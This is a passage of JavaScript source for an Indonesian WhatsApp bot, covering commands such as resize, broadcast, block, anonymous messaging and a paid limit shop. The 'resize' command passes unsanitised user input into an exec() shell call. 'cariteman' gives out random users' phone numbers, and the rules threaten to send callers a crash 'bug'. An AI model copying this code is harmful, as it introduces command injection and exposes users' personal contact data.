setReply(`Speed: ${latensi.toFixed(4)} Second`)
break
case 'ss':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('Masukan Link')
if (!isUrl(args[0]) && !args[0].includes('www.')) return reply('Link error')
if (args.length < 1) return setReply('Urlnya mana om')
let teks = q
let ana = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
let buff = await getBuffer(ana.screenshot)
await Araa.sendMessage(from, { caption: `Link: ${teks}`, image: buff }, { quoted: m })
}
break
case 'speedtest':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cp = require('child_process')
let { promisify } = require('util')
let exec2 = promisify(cp.exec).bind(cp)
await setReply('_Testing Speed..._')
let o
try {
o = await exec2('python speed.py')
} catch (e) {
o = e
} finally {
let { stdout, stderr } = o
if (stdout.trim()) setReply(stdout)
if (stderr.trim()) setReply(stderr)
}
}
break
case 'chat':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return setReply('Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete')
if (args[0] === 'mute') {
Araa.chatModify({ mute: 'Infinity' }, from, [])
.then((res) => setReply(jsonformat(res)))
.catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'unmute') {
Araa.chatModify({ mute: null }, from, [])
.then((res) => setReply(jsonformat(res)))
.catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'archive') {
Araa.chatModify({ archive: true }, from, [])
.then((res) => setReply(jsonformat(res)))
.catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'unarchive') {
Araa.chatModify({ archive: false }, from, [])
.then((res) => setReply(jsonformat(res)))
.catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'read') {
Araa.chatModify({ markRead: true }, from, [])
.then((res) => setReply(jsonformat(res)))
.catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'unread') {
Araa.chatModify({ markRead: false }, from, [])
.then((res) => setReply(jsonformat(res)))
.catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'delete') {
Araa.chatModify({ clear: { message: { id: m.id, fromMe: true } } }, from, [])
.then((res) => setReply(jsonformat(res)))
.catch((err) => setReply(jsonformat(err)))
} else if (q.startsWith('+') || q.startsWith('08') || q.startsWith('62')) {
if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62')
var nomor = q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')
var org = q.split('|')[1]
Araa.sendMessage(nomor + '@s.whatsapp.net', { text: org })
setReply(`Sukses mengirim chat:\n${org} ke nomer ${nomor}`)
}
}
break
case 'rules':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let teks = `
Syarat dan Ketentuan menggunakan *${botName}*

1. Nama dan nomer user ${botName}
     akan Kami simpan di dalam 
     server selama bot aktif
     
2. Data akan di hapus ketika bot Offline
     atau di hapus oleh Owner Bot

3. Kami tidak menyimpan gambar, 
     video, file, audio, dan dokumen 
     yang kamu kirim ke ${botName}
     
4. Kami tidak akan pernah meminta users 
     untuk memberikan informasi pribadi
     
5. Jika menemukan Bug/Error silahkan 
     langsung lapor ke Owner atau Developer
     atau bisa juga memakai fitur _*reportbug*_
     
6. Beberapa fitur mungkin ada yang error, 
     jadi tunggu sampai developer 
     meperbaiki fitur tersebut
         
8. Bot ini sudah di lengkapi dengan
     fitur _*Auto Report Bug*_ jika terjadi
     error maka bot akan auto report ke
     developer, terkecuali error yang
     menyebabkan bot mati, maka user
     harus lapor ke developer
     
7. Bot ini juga sudah di lengkapi dengan 
     Fitur Anti Spam jika kamu terdeteksi 
     melakukan spam, maka Bot tidak
     akan menanggapi kamu selama 20 detik
    
9. User dilarang keras menelpon bot!
     jika melanggar maka kamu akan terkena 
     banned,block dan dikirim bug

10. Bot tidak akan menanggapi user yang
       meminta untuk di save nomernya`
let mok = [
{ buttonId: `Thanks`, buttonText: { displayText: `ᴛʜᴀɴᴋs` }, type: 'RESPONSE' },
{ buttonId: `${prefix}dashboard`, buttonText: { displayText: `ᴅᴀsʜʙᴏᴀʀᴅ` }, type: 'RESPONSE' },
]
Araa.sendButImage(from, teks, fake, thumb, mok, { quoted: m })
}
break
case 'kalkulator':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
const matematik = require('mathjs')
try {
let nana = q.replace('x', '*')
let nunu = matematik.evaluate(nana)
let teks = `${q} = ${nunu}`
setReply(teks)
} catch (err) {
setReply('Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
break
case 'listpc':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
let anu = await store.chats
.all()
.filter((v) => v.id.endsWith('.net'))
.map((v) => v.id)
let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
for (let i of anu) {
let nama = await Araa.getName(`${i}`) 
teks += `◉ Nama : ${nama}\n◉ User : @${i.split('@')[0]}\n◉ Chat : https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
}
Araa.sendMessage(from, { text: teks, mentions: anu }, { quoted: m })                        
}
break
case 'listgc':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
let getGroups = await Araa.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
for (let i of anu) {
let metadata2 = await Araa.groupMetadata(i)
teks += `◉ Nama : ${metadata2.subject}\n◉ Owner : ${metadata2.owner !== undefined ? '@' + metadata2.owner.split`@`[0] : 'Tidak diketahui'}\n◉ ID : ${metadata2.id}\n◉ Dibuat : ${moment(metadata2.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
Araa.sendTextWithMentions(from, teks, m)
}
break
case 'inspect':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
const rex1 = /chat.whatsapp.com\/([\w\d]*)/g
let code = q.match(rex1)
if (code === null) return setReply('No invite url detected.')
code = code[0].replace('chat.whatsapp.com/', '')
let { id, subject, creator, creation, desc, descId } = await Araa.inspectLink(code).catch(async () => {
return setReply('Invalid invite url.')
})
let text =
`Subject: ${subject}\nGroupId: ${id}${creator ? `\nCreator: ${creator.split('@')[0]}` : ''}
Create At: ${new Date(creation * 1000).toLocaleString()}` + `${desc ? `\nDesc: ${desc}\nDescId: ${descId}` : ''}`
setReply(text)
}
break
case 'resize':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isQuotedImage || isImage) {
if (!q) return setReply(`Masukan ukuran panjangxlebar, contoh ${prefix + command} 300x300`)
onlyWait()
let panjang = q.split('x')[0]
let lebar = q.split('x')[1]
let media = await Araa.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.jpeg')
exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar}  ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await Araa.sendMessage(from, { mimetype: 'image/jpeg', image: buffer453, caption: `Nih ${q}` }, { quoted: m })
fs.unlinkSync(ran)
})
} else {
setReply('Reply Imagenya')
}
break
case 'kontak':
case 'contact':
try {
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (args[0] == '+62') return setReply(`Penggunaan\n${prefix + command} ${numberQuery.split('@')[0]}`)
if (args[0] == '08') return setReply('Gunakan kode negara kak')
if (!mentionByReply && !mentionByTag[0] && !numberQuery.split('@')[0]) return setReply(`Penggunaan\n${prefix + command} Reply\n${prefix + command} Reply ${ownerName}\n${prefix + command} @Tag\n${prefix + command} @Tag ${ownerName}\n${prefix + command} ${nomerOwner}\n${prefix + command} ${nomerOwner} ${ownerName}`)
var nice = await Araa.getName(Input)
if (mentionByReply && args[0]) {
await Araa.sendContact(from, mentionByReply.split('@')[0], args[0])
} else if (mentionByTag[0] && isGroup && args[1]) {
await Araa.sendContact(from, mentionByTag[0].split('@')[0], args[1])
} else if (!mentionByTag[0] && args[0] && args[1]) {
await Araa.sendContact(from, args[0], args[1])
} else if (mentionByReply && !args[0]) {
await Araa.sendContact(from, mentionByReply.split('@')[0], nice)
} else if (mentionByTag[0] && isGroup && !args[1]) {
await Araa.sendContact(from, mentionByTag[0].split('@')[0], nice)
} else if (!mentionByTag[0] && args[0] && !args[1]) {
await Araa.sendContact(from, args[0], nice)
}
} catch (err) {
console.log(err)
setReply(`${err}`)
}
break
case 'caridoi':
case 'cariteman':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isPremium && !m.key.fromMe) return onlyPrem()
let teman = pickRandom(user)
let namTemen = teman.name
let nomerTemen = teman.id
setTimeout(() => {
setReply('Sedang mencari....')
}, 1000)
setTimeout(() => {
setReply('Berhasil mendapatkan satu org')
}, 5000)
setTimeout(() => {
Araa.sendContact(from, nomerTemen, namTemen)
}, 9000)
break
case 'profile':
case 'me':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let ppimg = await Araa.profilePictureUrl(sender, 'image').catch((_) => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
let sol = await Araa.fetchStatus(sender)
let stst = sol.status == 401 ? '' : sol.status
let hituser = gethitUser(senderNumber)
let persenya = `${userPersen}`
let nana = `${userExp}/${requiredExp}`
let teks = `*]────「 Profile User 」────[*

🆔 Nama : ${pushname} 
💳 Saldo  : Rp ${getBalance(senderNumber).toLocaleString()}
✅ Verified : ${userVerified}
📇 Status : ${isPremium ? 'Premium' : 'Free'}
🧬 Level : ${userLevel}
🔰 Pangkat : ${userLeveling(userLevel)}
⚡ Exp :  ${userXp(userPersen)} ${persenya.split('.')[0]}%
♻️ Total Exp : ${nana}
📟 User Hit : ${hituser}
🤖 Status Bot : ${isOwner ? 'Owner' : 'User'}
📉 Limit : ${isPremium ? 'Unlimited' : `${getLimit(senderNumber)}`}
📈 Limit Game : ${cekGLimit(senderNumber, gcount)}/${gcounti.user}
📲 No : wa.me/${sender.split('@')[0]}
🧸 Bio : ${stst}`
let its = await getBuffer(ppimg)
const canvacord = require('canvacord')
let image3 = new canvacord.Rank()
.setAvatar(its)
.setCurrentXP(math(userExp))
.setRequiredXP(requiredExp)
.setStatus('online')
.setProgressBar('#FFFFFF', 'COLOR')
.setBackground('COLOR', '#141414')
.setCustomStatusColor('#ff1a8c')
.setUsername(`EXP: ${persenya.split('.')[0]}%,`)
.setLevel(userLevel)
.setRank(4)
.setOverlay('#3d3d3d')
.setDiscriminator('0007')
let foto = await getRandom('.png')
image3.build().then(async (data) => {
await canvacord.write(data, foto)
let gambar = await fs.readFileSync(foto)                            
await fs.unlinkSync(foto)
})
}
break
case 'getallstik':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
for (let i of setiker) {
let buffer = fs.readFileSync(`./media/sticker/stick/${i}.webp`)
await Araa.sendMessage(from, { sticker: buffer })
await sleep(1000)
}
}
break
case 'limit':
case 'ceklimit':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
setReply(`*${pushname}*\n\nLimit : ${isPremium ? 'Unlimited' : `${getLimit(senderNumber)}`}\nLimit Game : ${cekGLimit(senderNumber, gcount)}/${gcount}\nSaldo : Rp ${getBalance(senderNumber).toLocaleString()}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
break
case 'buylimit':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = Rp1000`)
if (q.includes('-')) return setReply(`Jangan menggunakan -`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
let ane = Number(math(q) * 1000)
if (getBalance(senderNumber) < ane) return setReply(`Saldo kamu tidak mencukupi untuk pembelian ini`)
kurangBalance(senderNumber, ane)
tambahLimit(senderNumber, math(q))
setReply(`Pembeliaan limit sebanyak ${q} berhasil\n\nSisa Saldo : Rp ${getBalance(senderNumber).toLocaleString()}\nSisa Limit : ${getLimit(senderNumber)}`)
}
break                
case 'shop':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let teks = `
*]────「 SHOP」────[*

Halo ${pushname} 
Saldo : Rp ${getBalance(senderNumber).toLocaleString()}

• List Harga
1 Limit : Rp 1000
1 Limit Game : Rp 750
1 Jam Premium : Rp 50,000

NOTE :
Untuk membeli Limit ketik ${prefix}buylimit jumlah limit
Contoh : ${prefix}buylimit 10

Untuk membeli Limit Game ketik ${prefix}buyglimit jumlah limit
Contoh : ${prefix}buyglimit 10`
setReply(teks)
}
break
case 'tr':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let translate = require('translate-google-api')
let defaultLang = 'en'
let tld = 'cn'
let err = `
Contoh:
${prefix + command} <lang> [text]
${prefix + command} id your messages

Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
`.trim()
let lang = args[0]
let text = args.slice(1).join(' ')
if ((args[0] || '').length !== 2) {
lang = defaultLang
text = args.join(' ')
}
if (!text && m.quoted && m.quoted.text) text = m.quoted.text
let result
try {
result = await translate(`${text}`, {
tld,
to: lang,
})
} catch (e) {
result = await translate(`${text}`, {
tld,
to: defaultLang,
})
setReply(err)
} finally {
setReply(result[0])
}
}
break
case 'delsampah':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let path = require('path')
let directoryPath = path.join()
fs.readdir(directoryPath, async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err)
return setReply('Unable to scan directory: ' + err)
}
let filteredArray = await files.filter((item) => item.endsWith('gif') || item.endsWith('png') || item.endsWith('mp3') || item.endsWith('mp4') || item.endsWith('webp'))
console.log(filteredArray.length)
let teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return setReply(teks)
filteredArray.map(function (e, i) {
teks += i + 1 + `. ${e}\n`
})
setReply(teks)
await sleep(2000)
setReply('Menghapus file sampah...')
await filteredArray.forEach(function (file) {
fs.unlinkSync(file)
})
await sleep(2000)
setReply('Berhasil menghapus semua sampah')
})
}
break
case 'ranking':
case 'rank':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
function perbandinganSkor(key, order = 'asc') {
return function innerSort(a, b) {
if (!a.hasOwnProperty(key) || !b.hasOwnProperty(key)) {
return setReply("property doesn't exist on either object")
}
const varA = typeof a[key] === 'string' ? a[key].toUpperCase() : a[key]
const varB = typeof b[key] === 'string' ? b[key].toUpperCase() : b[key]
let comparison = 0
if (varA > varB) {
comparison = 1
} else if (varA < varB) {
comparison = -1
}
return order === 'desc' ? comparison * -1 : comparison
}
}
let nana = user.sort(perbandinganSkor('level', 'desc'))
let usernye = `💬「 RANK USER 」\n\nJumlah : ${nana.length}\n\n`
nana.map(function (e, i) {
usernye += i + 1 + `.Nama : ${e.name}\n    Level : ${e.level}\n\n`
})
setReply(usernye)
}
break
case 'menfes':
case 'menfess':
try {
var nomor = q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
if (!q) return setReply(`Penggunaan ${prefix + command} ${nomerOwner}|pesan`) 
if (q.split('|')[0] && q.split('|')[1]) {
if (cekPengirimMenfes(sender)) return Araa.sendButMessage(from, `Masih ada chat yang belum selesai\nJika ingin berheti tekan button di bawah!`, fake, [{ buttonId: `${prefix + command} keluar pengirim`, buttonText: { displayText: "keluar" }, type: 1 }])
if (cekPenerimaMenfes(sender)) return Araa.sendButMessage(from, `Masih ada chat yang belum selesai\nJika ingin berheti tekan button di bawah!`, fake, [{ buttonId: `${prefix + command} keluar penerima`, buttonText: { displayText: "keluar" }, type: 1 }])
addMenfes(sender, nomor)
await Araa.sendButMessage(nomor, 
`Halo kak kamu mendapatkan pesan rahasia nih\nDari seseorang yang mengenal kamu\nIsi Pesan : ${q.split('|')[1]}`, 
fake, [
{ buttonId: `${prefix + command} balas pesan`, buttonText: { displayText: "balas" }, type: 1 }, 
{ buttonId: `${prefix + command} abaikan pesan`, buttonText: { displayText: "abaikan" }, type: 1 }]) 
setReply('Sukses mengirim pesan') 
} else if (args[0] == 'balas' && args[1] == 'pesan') {
setChatMenfes(sender) 
setReply('Sukses sekarang kamu dapat mengirim pesan kepada pengirim pesan') 
Araa.sendMessageV2(getIdPengirimMenfes(sender), {contextInfo: { externalAdReply: { showAdAttribution: true, title: `hallo kak👋 ${pushname}`, body: 'DONT CLICK HERE', previewType: 'PHOTO', thumbnail: ofrply, sourceUrl: `https://wa.me/${nomerOwner}?text=${textreply}` } }, text: `Pesan kamu telah di balas penerima pesan\nSekarang kamu dapat chat sma penerima pesan` })
} else if (args[0] == 'abaikan' && args[1] == 'pesan' || args[0] == 'keluar' && args[1] == 'penerima') {
delPenerimaMenfes(sender)
setReply('Sukses')
Araa.sendMessageV2(getIdPengirimMenfes(sender), {contextInfo: { externalAdReply: { showAdAttribution: true, title: `hallo kak👋 ${pushname}`, body: 'DONT CLICK HERE', previewType: 'PHOTO', thumbnail: ofrply, sourceUrl: `https://wa.me/${nomerOwner}?text=${textreply}` } }, text: `Penerima pesan telah mengabaikan pesan kamu` })
} else if (args[0] == 'keluar' && args[1] == 'pengirim') {
delPengirimMenfes(sender)
setReply('Sukses')
Araa.sendMessageV2(getIdPenerimaMenfes(sender), {contextInfo: { externalAdReply: { showAdAttribution: true, title: `hallo kak👋 ${pushname}`, body: 'DONT CLICK HERE', previewType: 'PHOTO', thumbnail: ofrply, sourceUrl: `https://wa.me/${nomerOwner}?text=${textreply}` } }, text: `Pengirim pesan telah meninggalkan kamu` })
}
} catch (err) {
console.log(err)
setReply('Maaf kak ada fitur sedang error')
}
break
//================================================================================\\
case 'join':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return setReply(`Kirim perintah ${command} _linkgrup_`)
var url = args[1]
let ano = q.split('https://chat.whatsapp.com/')[1]
await Araa.groupAcceptInvite(ano)
setReply('Sukses join group')
}
break
case 'bc':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args.length < 2) return reply(`Masukkan isi pesannya`)
var data = await store.chats.all()
for (let i of data) {
await Araa.sendMessage(i.id, { text: `${q}\n\n_*BROADCAST MESSAGE*_` })
await sleep(1000)
}
break
case 'bcgc':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply('Teksnya?')
let getGroups = await Araa.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anus = groupss.map((v) => v.id)
if (!q) return setReply('teksnya?')
setReply(`Mengirim Broadcast Ke ${anus.length} Chat, Waktu Selesai ${anus.length * 0.5} detik`)
let yesnih = [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 'RESPONSE' },
{ buttonId: `SEWA BOTZ`, buttonText: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ` }, type: 'RESPONSE' },
]
let teks = `*BROADCAST GROUP*\n\n${q}`
if (isImage || isQuotedImage) {
let buff = await Araa.downloadAndSaveMediaMessage(quoted)
for (let i of anus) {
await delay(1000)
await Araa.sendMessage(i, { caption: teks, image: fs.readFileSync(buff) }, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {}) },message: { orderMessage: { itemCount: 10000, status: 200, jpegThumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net' } },},})
}
fs.unlinkSync(buff)
} else if (isVideo || isQuotedVideo) {
let buff = await Araa.downloadAndSaveMediaMessage(quoted)
for (let i of anus) {
await delay(1000)
await Araa.sendMessage(i, { caption: teks, video: buff }, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {}) },message: { orderMessage: { itemCount: 10000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net' } },},})
}
fs.unlinkSync(buff)
} else if (isAudio || isQuotedAudio) {
let buff = await Araa.downloadAndSaveMediaMessage(quoted)
for (let i of anus) {
await delay(1000)
await Araa.sendMessage(i, { caption: teks, audio: fs.readFileSync(buff) },{ quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {}) },message: { orderMessage: { itemCount: 10000, status: 200, thumbnail: thumb, surface: 200, message: q, orderTitle: q, sellerJid: '0@s.whatsapp.net' } },},})
}
fs.unlinkSync(buff)
} else {
for (let i of anus) {
await delay(1000)
await Araa.sendButLoc(i, teks, fake, zfrply, yesnih)
}
}
setReply(`Sukses Mengirim Broadcast Ke ${anus.length} Group`)
}
break
case 'getcaze':
case 'getcase':
try {
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return setReply('*Mau nyari Case apa kak*')
if (q.startsWith(prefix)) return setReply('Query tidak boleh menggunakan prefix')
let nana = await getCase(q)
setReply(nana)
} catch (err) {
console.log(err)
setReply(`Case ${q} tidak di temukan`)
}
break
case 'leave':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isOwner && !m.key.fromMe) return onlyOwner()
await Araa.groupLeave(from)
break
case 'block':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (isGroup) {
if (users) {
await Araa.updateBlockStatus(users, 'block')
setReply(`Sukses block user`)
} else {
setReply('Silakan reply pesan atau tag atau input nomer yang mau di block')
}
} else if (!isGroup) {
if (q) {
var woke = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + `@s.whatsapp.net`
if (woke.startsWith('08')) return setReply('Awali nomer dengan 62')
if (!woke.startsWith('62')) return setReply('Silakan reply pesan atau tag atau input nomer yang mau di block')
await Araa.updateBlockStatus(woke, 'block')
} else if (!q) {
setReply('Masukan nomer yang ingin di block')
}
setReply(`Berhasil Block user ${woke.split('@')[0]}`)
}
break
case 'unblock':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (isGroup) {
if (users) {
await Araa.updateBlockStatus(users, 'unblock')
await setReply(`Sukses unblock user`)
} else if (!q) {
setReply('Silakan reply pesan atau tag atau input nomer yang mau di block')
}
} else if (!isGroup) {
if (q) {
let woke = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + `@s.whatsapp.net`
if (woke.startsWith('08')) return setReply('Awali nomer dengan 62')
if (!woke.startsWith('62')) return setReply('Silakan reply pesan atau tag atau input nomer yang mau di block')
await Araa.updateBlockStatus(woke, 'unblock')
setReply(`Sukses unblock ${woke}`)
} else if (!q) {
setReply('Masukan nomer yang ingin di unblock')
}
}
break
case 'blockcmd':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return setReply(`Textnya mana cih\n\nContoh : ${prefix}blockcmd menu\nGituuuuuuu`)
if (checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut sudah ada di database`)
addblockcmd(q, listcmdblock)
setReply(`Berhasil memblokir command 「 *${q}* 」\nsilakan ketik ${prefix}listblockcmd untuk melihat\ndaftar command yang telah di block`)
break
case 'unblockcmd':
try {
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return setReply('Textnya mana cih')
if (!checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut tidak ada di database`)
deleteblockcmd(q, listcmdblock)
setReply(`Berhasil unblock command 「 *${q}* 」`)
} catch (err) {
setReply('Bjirr error, keknya ada yang error')
}
break
case 'auto':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] === 'recording') {
if (auto === 'recording') return setReply('Udah aktif kak')
auto = 'recording'
setReply(`Mode auto ${args[0]} telah aktif`)
} else if (args[0] === 'typing') {
if (auto === 'typing') return setReply('Udah aktif kak')
auto = 'typing'
setReply(`Mode auto ${args[0]} telah aktif`)
} else if (args[0] === 'available') {
if (auto === 'available') return setReply('Udah aktif kak')
auto = 'available'
setReply(`Mode auto ${args[0]} telah aktif`)
} else if (!q) {
Araa.sendButMessage(from,`MODE AUTO`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix + command} recording`, buttonText: { displayText: 'ʀᴇᴄᴏʀᴅɪɴɢ' }, type: 1 },
{ buttonId: `${prefix + command} typing`, buttonText: { displayText: 'ᴛʏᴘɪɴɢ' }, type: 1 },
{ buttonId: `${prefix + command} available`, buttonText: { displayText: 'ᴀᴠᴀɪʟᴀʙʟᴇ' }, type: 1 },],setQuoted)
}
break                                        
case 'autolevel':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] === 'on' || args[0] === 'enable' || args[0] === '1') {
if (autoLevel) return setReply('Sudah aktif kak')
autoLevel = true
setReply(`Mode ${command} telah aktif kak`)
} else if (args[0] === 'off' || args[0] === 'disable' || args[0] === '0') {
if (!autoLevel) return setReply('Sudah Mati')
autoLevel = false
setReply(`Mode ${command} telah di matikan`)
} else if (!q) {
Araa.sendButMessage(from,`MODE AUTO LEVEL`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix + command} on`, buttonText: { displayText: On }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: Off }, type: 1 },],setQuoted)
}
break
case 'autobio':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] === 'on' || args[0] === 'enable' || args[0] === '1') {
if (autobio) return setReply('Sudah aktif kak')
autobio = true
setReply(`Mode ${command} telah aktif kak`)
} else if (args[0] === 'off' || args[0] === 'disable' || args[0] === '0') {
if (!autobio) return setReply('Sudah Mati')
autobio = false
setReply(`Mode ${command} telah di matikan`)
} else if (!q) {
Araa.sendButMessage(from,`MODE AUTO BIO`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix + command} on`, buttonText: { displayText: On }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: Off }, type: 1 },],setQuoted)
}
break
case 'autorespon':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] === 'on' || args[0] === 'enable' || args[0] === '1') {
if (autorespon === true) return setReply('Udah aktif kak')
autorespon = true
setReply(`Mode ${command} telah aktif kak`)
} else if (args[0] === 'off' || args[0] === 'disable' || args[0] === '0') {
if (autorespon === false) return setReply('Udah off kak')
autorespon = false
setReply(`Mode ${command} telah di matikan`)
} else if (!q) {
Araa.sendButMessage(from,`MODE AUTO RESPON`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix + command} on`, buttonText: { displayText: On }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: Off }, type: 1 },],setQuoted)
}
break
case 'autoread':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] === 'on' || args[0] === 'enable' || args[0] === '1') {
if (autoread === true) return setReply('Udah aktif kak')
autoread = true
setReply(`Mode ${command} telah aktif kak`)
} else if (args[0] === 'off' || args[0] === 'disable' || args[0] === '0') {
if (autoread === false) return setReply('Udah off kak')
autoread = false
setReply(`Mode ${command} telah di matikan`)
} else if (!q) {
Araa.sendButMessage(from,`MODE AUTO READ`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix + command} on`, buttonText: { displayText: On }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: Off }, type: 1 },],setQuoted)
}
break
case 'autosticker':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] === 'on' || args[0] === 'enable' || args[0] === '1') {
if (autoSticker === true) return setReply('Udah aktif kak')
autoSticker = true
setReply(`Mode ${command} telah aktif kak`)
} else if (args[0] === 'off' || args[0] === 'disable' || args[0] === '0') {
if (autoSticker === false) return setReply('Udah off kak')
autoSticker = false
setReply(`Mode ${command} telah di matikan`)
} else if (!q) {
Araa.sendButMessage(from,`MODE AUTO STICKER`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix + command} on`, buttonText: { displayText: On }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: Off }, type: 1 },],setQuoted)
}
break
case 'autovn':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] === 'on' || args[0] === 'enable' || args[0] === '1') {
if (autovn === true) return setReply('Udah aktif kak')
autovn = true
setReply(`Mode ${command} telah aktif kak`)
} else if (args[0] === 'off' || args[0] === 'disable' || args[0] === '0') {
if (autovn === false) return setReply('Udah off kak')
autovn = false
let eh = 
setReply(`Mode ${command} telah di matikan`)
} else if (!q) {
Araa.sendButMessage(from,`MODE AUTO VN`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix + command} on`, buttonText: { displayText: On }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: Off }, type: 1 },],setQuoted)
}
break
